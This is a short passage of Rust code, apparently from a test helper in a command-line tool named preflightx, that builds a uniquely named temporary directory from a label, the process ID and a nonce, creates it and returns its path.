    let path = std::env::temp_dir().join(format!(
        "preflightx-cli-{label}-{}-{nonce}",
        std::process::id()
    ));
    fs::create_dir(&path).unwrap();
    path
}
